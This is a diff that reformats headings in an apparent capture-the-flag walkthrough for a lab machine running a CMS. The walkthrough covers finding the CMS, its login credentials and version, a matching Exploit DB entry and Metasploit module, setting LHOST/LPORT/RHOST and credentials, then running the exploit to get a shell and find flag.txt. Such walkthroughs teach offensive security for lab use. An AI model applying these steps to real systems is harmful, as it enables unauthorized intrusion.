@@ -90,7 +90,7 @@ We didn't get anything useful.
 
 # Level 1
 
-## Q1. What port number has a web server with a CMS running and how to exploit it?
+## Q1. What port number has a web server with a CMS running?
 
 **Ans:**
 
@@ -109,7 +109,7 @@ So now you have the answer of **1st Question**.
 
 ---
 
-### Q2. What is the username we can find in the CMS?
+## Q2. What is the username we can find in the CMS?
 
 **Ans:**
 
@@ -119,7 +119,7 @@ It is written on the page. Check it wisely.
 
 ---
 
-### Q3. What is the password we can find for the username?
+## Q3. What is the password we can find for the username?
 
 **Ans:**
 
@@ -155,7 +155,7 @@ I used the credentials and successfully logged in.
 
 ---
 
-### Q4. What version of the CMS is installed on the server?
+## Q4. What version of the CMS is installed on the server?
 
 **Ans:**
 
@@ -167,7 +167,7 @@ Now you have to see the **lower-left corner**. It is the point where the version
 
 # Level 2
 
-### Q5. There's an exploit for a previous version of this CMS. Find it on Exploit DB. What's its EDB-ID?
+## Q5. There's an exploit for a previous version of this CMS. Find it on Exploit DB. What's its EDB-ID?
 
 **Ans:**
 
@@ -212,7 +212,7 @@ Write only the number. Don't add `.py` extension.
 
 ---
 
-### Q6. Metasploit recently added an exploit module for this vulnerability. What's the full path?
+## Q6. Metasploit recently added an exploit module for this vulnerability. What's the full path?
 
 **Ans:**
 
@@ -249,11 +249,11 @@ exploit/.../.../..._..._...
 
 ---
 
-### Q7. Configure exploit options
+## Q7. Configure exploit options
 
 Now configure the exploit.
 
-**LHOST**
+### LHOST
 
 ```bash
 set LHOST IP
@@ -270,25 +270,25 @@ ip addr
 
 ![bolt-msf-setting](https://github.com/user-attachments/assets/b030eee1-e75c-4067-ba89-fb2ce892a7da)
 
-**LPORT**
+### LPORT
 
 ```bash
 set LPORT 443
 ```
 
-**RHOST**
+### RHOST
 
 ```bash
 set RHOST IP
 ```
 
-**USERNAME**
+### USERNAME
 
 ```bash
 set USERNAME <Username>
 ```
 
-**PASSWORD**
+### PASSWORD
 
 ```bash
 set PASSWORD <Password>
@@ -302,7 +302,7 @@ exploit
 
 ---
 
-### Q8. Look for flag.txt
+## Q8. Look for flag.txt
 
 Now we have successfully exploited the machine and will look for the flag.
 
@@ -316,7 +316,7 @@ I didn't get any result because I am in a default directory.
 
 ![bolt-got-ls](https://github.com/user-attachments/assets/4097cd50-60cd-42a2-9fd9-e207e1aface5)
 
-Example explanation:
+### Example explanation:
 
 If you are in directory `var/www/` you will only see folders under that directory.
 
